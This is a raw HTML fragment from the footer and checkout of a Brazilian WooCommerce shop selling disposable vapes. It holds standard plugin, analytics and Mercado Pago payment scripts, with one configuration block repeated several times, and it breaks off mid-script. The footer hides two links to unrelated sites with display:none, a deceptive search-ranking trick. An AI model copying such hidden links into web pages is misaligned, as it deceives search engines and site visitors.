+<ul><li><a href="https://brpods.com/politica-de-privacidade/">Política de Privacidade</a></li><li><a href="https://brpods.com/politica-de-devolucao/">Política de Devolução</a></li><li><a href="https://brpods.com/termos-de-servico/">Termos de Serviço</a></li><li style="display:none"><a href="https://doutorvapor.com/">
+Loja Doutor Vapor - Cigarros Eletrônicos, Vapes, Juul, Refil, NicSalt, E-liquid</a></li><li style="display:none"><a href="https://consultarcep.info/">Consulte seu CEP</a></li></ul>
+</div> </div>
+</aside>
+</div>
+</footer>
+</div> 
+<div class="basel-close-side"></div>
+<script type="b19bda5e6f031c08c895a890-text/javascript">window.wpsc_print_css_uri = 'https://brpods.com/wp-content/plugins/structured-content/dist/print.css';</script>
+
+<script type="b19bda5e6f031c08c895a890-text/javascript">
+(function () {
+var options = {
+            whatsapp: "+5511972980563", 
+            call_to_action: "Fale conosco", 
+            position: "right", 
+        };
+    var proto = 'https:', host = "getbutton.io", url = proto + '//static.' + host;
+    var s = document.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = url + '/widget-send-button/js/init.js';
+    s.onload = function () { WhWidgetSendButton.init(host, proto, options); };
+    var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(s, x);
+})();
+</script>
+
+<a href="#" class="scrollToTop basel-tooltip">Scroll To Top</a>
+<script type="b19bda5e6f031c08c895a890-text/javascript">
+		(function () {
+			var c = document.body.className;
+			c = c.replace(/woocommerce-no-js/, 'woocommerce-js');
+			document.body.className = c;
+		})();
+	</script>
+<link rel="stylesheet" id="woocommerce-extra-checkout-fields-for-brazil-front-css" href="https://brpods.com/wp-content/plugins/woocommerce-extra-checkout-fields-for-brazil/assets/css/frontend/frontend.css?ver=4.0.2" type="text/css" media="all" />
+<style id="core-block-supports-inline-css" type="text/css">
+/**
+ * Core styles: block-supports
+ */
+
+</style>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/structured-content/dist/app.build.js?ver=1.6.2" id="structured-content-frontend-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/contact-form-7/includes/swv/js/index.js?ver=5.9.6" id="swv-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="contact-form-7-js-extra">
+/* <![CDATA[ */
+var wpcf7 = {"api":{"root":"https:\/\/brpods.com\/wp-json\/","namespace":"contact-form-7\/v1"}};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.9.6" id="contact-form-7-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce/assets/js/selectWoo/selectWoo.full.js?ver=1.0.9-wc.8.6.1" id="selectWoo-js" data-wp-strategy="defer"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="thwcfd-checkout-script-js-extra">
+/* <![CDATA[ */
+var thwcfd_public_var = {"is_override_required":""};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woo-checkout-field-editor-pro/public/assets/js/thwcfd-public.min.js?ver=2.0.2" id="thwcfd-checkout-script-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce/assets/js/sourcebuster/sourcebuster.js?ver=8.6.1" id="sourcebuster-js-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="wc-order-attribution-js-extra">
+/* <![CDATA[ */
+var wc_order_attribution = {"params":{"lifetime":1.0000000000000000818030539140313095458623138256371021270751953125e-5,"session":30,"ajaxurl":"https:\/\/brpods.com\/wp-admin\/admin-ajax.php","prefix":"wc_order_attribution_","allowTracking":true},"fields":{"source_type":"current.typ","referrer":"current_add.rf","utm_campaign":"current.cmp","utm_source":"current.src","utm_medium":"current.mdm","utm_content":"current.cnt","utm_id":"current.id","utm_term":"current.trm","session_entry":"current_add.ep","session_start_time":"current_add.fd","session_pages":"session.pgs","session_count":"udata.vst","user_agent":"udata.uag"}};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce/assets/js/frontend/order-attribution.js?ver=8.6.1" id="wc-order-attribution-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/autocomplete-address-for-woocommerce/assets/js/autocomplete-address.13ea6708a9ad0da13098.min.js?ver=1.3.2" id="wc-autocomplete-address-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/duracelltomi-google-tag-manager/js/gtm4wp-form-move-tracker.js?ver=1.20.2" id="gtm4wp-form-move-tracker-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="gtm4wp-additional-datalayer-pushes-js-after">
+/* <![CDATA[ */
+	dataLayer.push({"ecommerce":{"currency":"BRL","value":170,"items":[{"item_id":30892,"item_name":"Descartável - POD IGNITE V50 - 5000 PUFFS - 500mAh (Recarregável)","sku":"ignite-v50-new-aloe","price":85,"stocklevel":9,"stockstatus":"instock","google_business_vertical":"retail","item_category":"Descartáveis","id":30892,"item_variant":"Aloe Grape","quantity":2}]},"event":"begin_checkout"});
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/duracelltomi-google-tag-manager/js/gtm4wp-ecommerce-generic.js?ver=1.20.2" id="gtm4wp-ecommerce-generic-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/duracelltomi-google-tag-manager/js/gtm4wp-woocommerce.js?ver=1.20.2" id="gtm4wp-woocommerce-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce-extra-checkout-fields-for-brazil/assets/js/jquery.mask/jquery.mask.js?ver=1.14.10" id="jquery-mask-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/js/checkouts/mp-plugins-components.js?ver=7.6.1" id="wc_mercadopago_checkout_components-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/js/checkouts/mp-checkout-update.js?ver=7.6.1" id="wc_mercadopago_checkout_update-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://sdk.mercadopago.com/js/v2?ver=7.6.1" id="wc_mercadopago_sdk-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/js/checkouts/custom/session.js?ver=7.6.1" id="wc_mercadopago_security_session-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/js/checkouts/custom/mp-custom-page.js?ver=7.6.1" id="wc_mercadopago_custom_page-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/js/checkouts/custom/mp-custom-elements.js?ver=7.6.1" id="wc_mercadopago_custom_elements-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="wc_mercadopago_custom_checkout-js-extra">
+/* <![CDATA[ */
+var wc_mercadopago_custom_checkout_params = {"public_key":"APP_USR-5d0cc21f-dd5b-43e2-9d24-acab383774e2","intl":"pt-BR","site_id":"MLB","currency":"BRL","theme":"basel","location":"\/checkout","plugin_version":"7.6.1","platform_version":"8.6.1","cvvText":"d\u00edgitos","installmentObsFee":"Sem acr\u00e9scimos","installmentButton":"Mais op\u00e7\u00f5es","bankInterestText":"Se houverem acr\u00e9scimos, eles ser\u00e3o aplicados pelo seu banco.","interestText":"Acr\u00e9scimos","placeholders":{"issuer":"Banco emissor","installments":"Parcelamento","cardExpirationDate":"mm\/aa"},"cvvHint":{"back":"do verso","front":"da frente"},"input_helper_message":{"cardNumber":{"invalid_type":"N\u00famero do cart\u00e3o \u00e9 obrigat\u00f3rio","invalid_length":"N\u00famero do cart\u00e3o inv\u00e1lido"},"cardholderName":{"221":"Nome do titular \u00e9 obrigat\u00f3rio","316":"Nome do titular inv\u00e1lido"},"expirationDate":{"invalid_type":"Data de vencimento inv\u00e1lida","invalid_length":"Data de vencimento incompleta","invalid_value":"Data de vencimento inv\u00e1lida"},"securityCode":{"invalid_type":"C\u00f3digo de seguran\u00e7a \u00e9 obrigat\u00f3rio","invalid_length":"C\u00f3digo de seguran\u00e7a incompleto"}},"threeDsText":{"title_loading":"Estamos levando voc\u00ea para validar o cart\u00e3o","title_loading2":"com seu banco","text_loading":"Precisamos confirmar que voc\u00ea \u00e9 o titular do cart\u00e3o.","title_loading_response":"Estamos recebendo a resposta do seu banco","title_frame":"Conclua a valida\u00e7\u00e3o banc\u00e1ria para aprovar seu pagamento","tooltip_frame":"Mantenha esta tela aberta. Se voc\u00ea fech\u00e1-la, n\u00e3o poder\u00e1 retomar a valida\u00e7\u00e3o.","message_close":"<b>Por motivos de seguran\u00e7a, seu pagamento foi recusado<\/b><br>Recomendamos que voc\u00ea pague com o meio de pagamento e dispositivo que costuma usar para compras on-line."}};
+var wc_mercadopago_custom_checkout_params = {"public_key":"APP_USR-5d0cc21f-dd5b-43e2-9d24-acab383774e2","intl":"pt-BR","site_id":"MLB","currency":"BRL","theme":"basel","location":"\/checkout","plugin_version":"7.6.1","platform_version":"8.6.1","cvvText":"d\u00edgitos","installmentObsFee":"Sem acr\u00e9scimos","installmentButton":"Mais op\u00e7\u00f5es","bankInterestText":"Se houverem acr\u00e9scimos, eles ser\u00e3o aplicados pelo seu banco.","interestText":"Acr\u00e9scimos","placeholders":{"issuer":"Banco emissor","installments":"Parcelamento","cardExpirationDate":"mm\/aa"},"cvvHint":{"back":"do verso","front":"da frente"},"input_helper_message":{"cardNumber":{"invalid_type":"N\u00famero do cart\u00e3o \u00e9 obrigat\u00f3rio","invalid_length":"N\u00famero do cart\u00e3o inv\u00e1lido"},"cardholderName":{"221":"Nome do titular \u00e9 obrigat\u00f3rio","316":"Nome do titular inv\u00e1lido"},"expirationDate":{"invalid_type":"Data de vencimento inv\u00e1lida","invalid_length":"Data de vencimento incompleta","invalid_value":"Data de vencimento inv\u00e1lida"},"securityCode":{"invalid_type":"C\u00f3digo de seguran\u00e7a \u00e9 obrigat\u00f3rio","invalid_length":"C\u00f3digo de seguran\u00e7a incompleto"}},"threeDsText":{"title_loading":"Estamos levando voc\u00ea para validar o cart\u00e3o","title_loading2":"com seu banco","text_loading":"Precisamos confirmar que voc\u00ea \u00e9 o titular do cart\u00e3o.","title_loading_response":"Estamos recebendo a resposta do seu banco","title_frame":"Conclua a valida\u00e7\u00e3o banc\u00e1ria para aprovar seu pagamento","tooltip_frame":"Mantenha esta tela aberta. Se voc\u00ea fech\u00e1-la, n\u00e3o poder\u00e1 retomar a valida\u00e7\u00e3o.","message_close":"<b>Por motivos de seguran\u00e7a, seu pagamento foi recusado<\/b><br>Recomendamos que voc\u00ea pague com o meio de pagamento e dispositivo que costuma usar para compras on-line."}};
+var wc_mercadopago_custom_checkout_params = {"public_key":"APP_USR-5d0cc21f-dd5b-43e2-9d24-acab383774e2","intl":"pt-BR","site_id":"MLB","currency":"BRL","theme":"basel","location":"\/checkout","plugin_version":"7.6.1","platform_version":"8.6.1","cvvText":"d\u00edgitos","installmentObsFee":"Sem acr\u00e9scimos","installmentButton":"Mais op\u00e7\u00f5es","bankInterestText":"Se houverem acr\u00e9scimos, eles ser\u00e3o aplicados pelo seu banco.","interestText":"Acr\u00e9scimos","placeholders":{"issuer":"Banco emissor","installments":"Parcelamento","cardExpirationDate":"mm\/aa"},"cvvHint":{"back":"do verso","front":"da frente"},"input_helper_message":{"cardNumber":{"invalid_type":"N\u00famero do cart\u00e3o \u00e9 obrigat\u00f3rio","invalid_length":"N\u00famero do cart\u00e3o inv\u00e1lido"},"cardholderName":{"221":"Nome do titular \u00e9 obrigat\u00f3rio","316":"Nome do titular inv\u00e1lido"},"expirationDate":{"invalid_type":"Data de vencimento inv\u00e1lida","invalid_length":"Data de vencimento incompleta","invalid_value":"Data de vencimento inv\u00e1lida"},"securityCode":{"invalid_type":"C\u00f3digo de seguran\u00e7a \u00e9 obrigat\u00f3rio","invalid_length":"C\u00f3digo de seguran\u00e7a incompleto"}},"threeDsText":{"title_loading":"Estamos levando voc\u00ea para validar o cart\u00e3o","title_loading2":"com seu banco","text_loading":"Precisamos confirmar que voc\u00ea \u00e9 o titular do cart\u00e3o.","title_loading_response":"Estamos recebendo a resposta do seu banco","title_frame":"Conclua a valida\u00e7\u00e3o banc\u00e1ria para aprovar seu pagamento","tooltip_frame":"Mantenha esta tela aberta. Se voc\u00ea fech\u00e1-la, n\u00e3o poder\u00e1 retomar a valida\u00e7\u00e3o.","message_close":"<b>Por motivos de seguran\u00e7a, seu pagamento foi recusado<\/b><br>Recomendamos que voc\u00ea pague com o meio de pagamento e dispositivo que costuma usar para compras on-line."}};
+var wc_mercadopago_custom_checkout_params = {"public_key":"APP_USR-5d0cc21f-dd5b-43e2-9d24-acab383774e2","intl":"pt-BR","site_id":"MLB","currency":"BRL","theme":"basel","location":"\/checkout","plugin_version":"7.6.1","platform_version":"8.6.1","cvvText":"d\u00edgitos","installmentObsFee":"Sem acr\u00e9scimos","installmentButton":"Mais op\u00e7\u00f5es","bankInterestText":"Se houverem acr\u00e9scimos, eles ser\u00e3o aplicados pelo seu banco.","interestText":"Acr\u00e9scimos","placeholders":{"issuer":"Banco emissor","installments":"Parcelamento","cardExpirationDate":"mm\/aa"},"cvvHint":{"back":"do verso","front":"da frente"},"input_helper_message":{"cardNumber":{"invalid_type":"N\u00famero do cart\u00e3o \u00e9 obrigat\u00f3rio","invalid_length":"N\u00famero do cart\u00e3o inv\u00e1lido"},"cardholderName":{"221":"Nome do titular \u00e9 obrigat\u00f3rio","316":"Nome do titular inv\u00e1lido"},"expirationDate":{"invalid_type":"Data de vencimento inv\u00e1lida","invalid_length":"Data de vencimento incompleta","invalid_value":"Data de vencimento inv\u00e1lida"},"securityCode":{"invalid_type":"C\u00f3digo de seguran\u00e7a \u00e9 obrigat\u00f3rio","invalid_length":"C\u00f3digo de seguran\u00e7a incompleto"}},"threeDsText":{"title_loading":"Estamos levando voc\u00ea para validar o cart\u00e3o","title_loading2":"com seu banco","text_loading":"Precisamos confirmar que voc\u00ea \u00e9 o titular do cart\u00e3o.","title_loading_response":"Estamos recebendo a resposta do seu banco","title_frame":"Conclua a valida\u00e7\u00e3o banc\u00e1ria para aprovar seu pagamento","tooltip_frame":"Mantenha esta tela aberta. Se voc\u00ea fech\u00e1-la, n\u00e3o poder\u00e1 retomar a valida\u00e7\u00e3o.","message_close":"<b>Por motivos de seguran\u00e7a, seu pagamento foi recusado<\/b><br>Recomendamos que voc\u00ea pague com o meio de pagamento e dispositivo que costuma usar para compras on-line."}};
+var wc_mercadopago_custom_checkout_params = {"public_key":"APP_USR-5d0cc21f-dd5b-43e2-9d24-acab383774e2","intl":"pt-BR","site_id":"MLB","currency":"BRL","theme":"basel","location":"\/checkout","plugin_version":"7.6.1","platform_version":"8.6.1","cvvText":"d\u00edgitos","installmentObsFee":"Sem acr\u00e9scimos","installmentButton":"Mais op\u00e7\u00f5es","bankInterestText":"Se houverem acr\u00e9scimos, eles ser\u00e3o aplicados pelo seu banco.","interestText":"Acr\u00e9scimos","placeholders":{"issuer":"Banco emissor","installments":"Parcelamento","cardExpirationDate":"mm\/aa"},"cvvHint":{"back":"do verso","front":"da frente"},"input_helper_message":{"cardNumber":{"invalid_type":"N\u00famero do cart\u00e3o \u00e9 obrigat\u00f3rio","invalid_length":"N\u00famero do cart\u00e3o inv\u00e1lido"},"cardholderName":{"221":"Nome do titular \u00e9 obrigat\u00f3rio","316":"Nome do titular inv\u00e1lido"},"expirationDate":{"invalid_type":"Data de vencimento inv\u00e1lida","invalid_length":"Data de vencimento incompleta","invalid_value":"Data de vencimento inv\u00e1lida"},"securityCode":{"invalid_type":"C\u00f3digo de seguran\u00e7a \u00e9 obrigat\u00f3rio","invalid_length":"C\u00f3digo de seguran\u00e7a incompleto"}},"threeDsText":{"title_loading":"Estamos levando voc\u00ea para validar o cart\u00e3o","title_loading2":"com seu banco","text_loading":"Precisamos confirmar que voc\u00ea \u00e9 o titular do cart\u00e3o.","title_loading_response":"Estamos recebendo a resposta do seu banco","title_frame":"Conclua a valida\u00e7\u00e3o banc\u00e1ria para aprovar seu pagamento","tooltip_frame":"Mantenha esta tela aberta. Se voc\u00ea fech\u00e1-la, n\u00e3o poder\u00e1 retomar a valida\u00e7\u00e3o.","message_close":"<b>Por motivos de seguran\u00e7a, seu pagamento foi recusado<\/b><br>Recomendamos que voc\u00ea pague com o meio de pagamento e dispositivo que costuma usar para compras on-line."}};
+var wc_mercadopago_custom_checkout_params = {"public_key":"APP_USR-5d0cc21f-dd5b-43e2-9d24-acab383774e2","intl":"pt-BR","site_id":"MLB","currency":"BRL","theme":"basel","location":"\/checkout","plugin_version":"7.6.1","platform_version":"8.6.1","cvvText":"d\u00edgitos","installmentObsFee":"Sem acr\u00e9scimos","installmentButton":"Mais op\u00e7\u00f5es","bankInterestText":"Se houverem acr\u00e9scimos, eles ser\u00e3o aplicados pelo seu banco.","interestText":"Acr\u00e9scimos","placeholders":{"issuer":"Banco emissor","installments":"Parcelamento","cardExpirationDate":"mm\/aa"},"cvvHint":{"back":"do verso","front":"da frente"},"input_helper_message":{"cardNumber":{"invalid_type":"N\u00famero do cart\u00e3o \u00e9 obrigat\u00f3rio","invalid_length":"N\u00famero do cart\u00e3o inv\u00e1lido"},"cardholderName":{"221":"Nome do titular \u00e9 obrigat\u00f3rio","316":"Nome do titular inv\u00e1lido"},"expirationDate":{"invalid_type":"Data de vencimento inv\u00e1lida","invalid_length":"Data de vencimento incompleta","invalid_value":"Data de vencimento inv\u00e1lida"},"securityCode":{"invalid_type":"C\u00f3digo de seguran\u00e7a \u00e9 obrigat\u00f3rio","invalid_length":"C\u00f3digo de seguran\u00e7a incompleto"}},"threeDsText":{"title_loading":"Estamos levando voc\u00ea para validar o cart\u00e3o","title_loading2":"com seu banco","text_loading":"Precisamos confirmar que voc\u00ea \u00e9 o titular do cart\u00e3o.","title_loading_response":"Estamos recebendo a resposta do seu banco","title_frame":"Conclua a valida\u00e7\u00e3o banc\u00e1ria para aprovar seu pagamento","tooltip_frame":"Mantenha esta tela aberta. Se voc\u00ea fech\u00e1-la, n\u00e3o poder\u00e1 retomar a valida\u00e7\u00e3o.","message_close":"<b>Por motivos de seguran\u00e7a, seu pagamento foi recusado<\/b><br>Recomendamos que voc\u00ea pague com o meio de pagamento e dispositivo que costuma usar para compras on-line."}};
+var wc_mercadopago_custom_checkout_params = {"public_key":"APP_USR-5d0cc21f-dd5b-43e2-9d24-acab383774e2","intl":"pt-BR","site_id":"MLB","currency":"BRL","theme":"basel","location":"\/checkout","plugin_version":"7.6.1","platform_version":"8.6.1","cvvText":"d\u00edgitos","installmentObsFee":"Sem acr\u00e9scimos","installmentButton":"Mais op\u00e7\u00f5es","bankInterestText":"Se houverem acr\u00e9scimos, eles ser\u00e3o aplicados pelo seu banco.","interestText":"Acr\u00e9scimos","placeholders":{"issuer":"Banco emissor","installments":"Parcelamento","cardExpirationDate":"mm\/aa"},"cvvHint":{"back":"do verso","front":"da frente"},"input_helper_message":{"cardNumber":{"invalid_type":"N\u00famero do cart\u00e3o \u00e9 obrigat\u00f3rio","invalid_length":"N\u00famero do cart\u00e3o inv\u00e1lido"},"cardholderName":{"221":"Nome do titular \u00e9 obrigat\u00f3rio","316":"Nome do titular inv\u00e1lido"},"expirationDate":{"invalid_type":"Data de vencimento inv\u00e1lida","invalid_length":"Data de vencimento incompleta","invalid_value":"Data de vencimento inv\u00e1lida"},"securityCode":{"invalid_type":"C\u00f3digo de seguran\u00e7a \u00e9 obrigat\u00f3rio","invalid_length":"C\u00f3digo de seguran\u00e7a incompleto"}},"threeDsText":{"title_loading":"Estamos levando voc\u00ea para validar o cart\u00e3o","title_loading2":"com seu banco","text_loading":"Precisamos confirmar que voc\u00ea \u00e9 o titular do cart\u00e3o.","title_loading_response":"Estamos recebendo a resposta do seu banco","title_frame":"Conclua a valida\u00e7\u00e3o banc\u00e1ria para aprovar seu pagamento","tooltip_frame":"Mantenha esta tela aberta. Se voc\u00ea fech\u00e1-la, n\u00e3o poder\u00e1 retomar a valida\u00e7\u00e3o.","message_close":"<b>Por motivos de seguran\u00e7a, seu pagamento foi recusado<\/b><br>Recomendamos que voc\u00ea pague com o meio de pagamento e dispositivo que costuma usar para compras on-line."}};
+var wc_mercadopago_custom_checkout_params = {"public_key":"APP_USR-5d0cc21f-dd5b-43e2-9d24-acab383774e2","intl":"pt-BR","site_id":"MLB","currency":"BRL","theme":"basel","location":"\/checkout","plugin_version":"7.6.1","platform_version":"8.6.1","cvvText":"d\u00edgitos","installmentObsFee":"Sem acr\u00e9scimos","installmentButton":"Mais op\u00e7\u00f5es","bankInterestText":"Se houverem acr\u00e9scimos, eles ser\u00e3o aplicados pelo seu banco.","interestText":"Acr\u00e9scimos","placeholders":{"issuer":"Banco emissor","installments":"Parcelamento","cardExpirationDate":"mm\/aa"},"cvvHint":{"back":"do verso","front":"da frente"},"input_helper_message":{"cardNumber":{"invalid_type":"N\u00famero do cart\u00e3o \u00e9 obrigat\u00f3rio","invalid_length":"N\u00famero do cart\u00e3o inv\u00e1lido"},"cardholderName":{"221":"Nome do titular \u00e9 obrigat\u00f3rio","316":"Nome do titular inv\u00e1lido"},"expirationDate":{"invalid_type":"Data de vencimento inv\u00e1lida","invalid_length":"Data de vencimento incompleta","invalid_value":"Data de vencimento inv\u00e1lida"},"securityCode":{"invalid_type":"C\u00f3digo de seguran\u00e7a \u00e9 obrigat\u00f3rio","invalid_length":"C\u00f3digo de seguran\u00e7a incompleto"}},"threeDsText":{"title_loading":"Estamos levando voc\u00ea para validar o cart\u00e3o","title_loading2":"com seu banco","text_loading":"Precisamos confirmar que voc\u00ea \u00e9 o titular do cart\u00e3o.","title_loading_response":"Estamos recebendo a resposta do seu banco","title_frame":"Conclua a valida\u00e7\u00e3o banc\u00e1ria para aprovar seu pagamento","tooltip_frame":"Mantenha esta tela aberta. Se voc\u00ea fech\u00e1-la, n\u00e3o poder\u00e1 retomar a valida\u00e7\u00e3o.","message_close":"<b>Por motivos de seguran\u00e7a, seu pagamento foi recusado<\/b><br>Recomendamos que voc\u00ea pague com o meio de pagamento e dispositivo que costuma usar para compras on-line."}};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/js/checkouts/custom/mp-custom-checkout.js?ver=7.6.1" id="wc_mercadopago_custom_checkout-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/js/checkouts/ticket/mp-ticket-page.js?ver=7.6.1" id="wc_mercadopago_ticket_page-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/js/checkouts/ticket/mp-ticket-elements.js?ver=7.6.1" id="wc_mercadopago_ticket_elements-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="wc_mercadopago_ticket_checkout-js-extra">
+/* <![CDATA[ */
+var wc_mercadopago_ticket_checkout_params = {"site_id":"MLB"};
+var wc_mercadopago_ticket_checkout_params = {"site_id":"MLB"};
+var wc_mercadopago_ticket_checkout_params = {"site_id":"MLB"};
+var wc_mercadopago_ticket_checkout_params = {"site_id":"MLB"};
+var wc_mercadopago_ticket_checkout_params = {"site_id":"MLB"};
+var wc_mercadopago_ticket_checkout_params = {"site_id":"MLB"};
+var wc_mercadopago_ticket_checkout_params = {"site_id":"MLB"};
+var wc_mercadopago_ticket_checkout_params = {"site_id":"MLB"};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/js/checkouts/ticket/mp-ticket-checkout.js?ver=7.6.1" id="wc_mercadopago_ticket_checkout-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/js_composer/assets/lib/vendor/node_modules/isotope-layout/dist/isotope.pkgd.min.js?ver=7.7.2" id="isotope-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/js_composer/assets/js/dist/js_composer_front.min.js?ver=7.7.2" id="wpb_composer_front_js-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/jquery.magnific-popup.min.js?ver=555.4.0" id="basel-magnific-popup-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/owl.carousel.min.js?ver=555.4.0" id="basel-owl-carousel-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/photoswipe.min.js?ver=555.4.0" id="basel-photoswipe-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/photoswipe-ui-default.min.js?ver=555.4.0" id="basel-photoswipe-ui-default-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/slick.min.js?ver=555.4.0" id="basel-slick-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/jquery.justifiedGallery.min.js?ver=555.4.0" id="basel-justified-gallery-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/imagesloaded.pkgd.min.js?ver=555.4.0" id="basel-imagesloaded-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/jquery.pjax.min.js?ver=555.4.0" id="basel-pjax-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/jquery.countdown.min.js?ver=555.4.0" id="basel-countdown-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/packery-mode.pkgd.min.js?ver=555.4.0" id="basel-packery-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/jquery.autocomplete.min.js?ver=555.4.0" id="basel-autocomplete-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/threesixty.min.js?ver=555.4.0" id="basel-threesixty-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/TweenMax.min.js?ver=555.4.0" id="basel-tween-max-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/jquery.nanoscroller.min.js?ver=555.4.0" id="basel-nanoscroller-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/jquery.panr.min.js?ver=555.4.0" id="basel-panr-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/jquery.parallax.min.js?ver=555.4.0" id="basel-parallax-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/vivus.min.js?ver=555.4.0" id="basel-vivus-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/dayjs-index.min.js?ver=555.4.0" id="basel-dayjs-index-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/dayjs.min.js?ver=555.4.0" id="basel-dayjs-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/dayjs-utc.min.js?ver=555.4.0" id="basel-dayjs-utc-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/dayjs-timezone.min.js?ver=555.4.0" id="basel-dayjs-timezone-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/fastclick.min.js?ver=555.4.0" id="basel-fastclick-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/jquery.parallax-scroll.min.js?ver=555.4.0" id="basel-parallax-scroll-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/device.min.js?ver=555.4.0" id="basel-device-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/themes/basel/js/waypoints.min.js?ver=555.4.0" id="basel-waypoints-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="basel-functions-js-extra">
+/* <![CDATA[ */
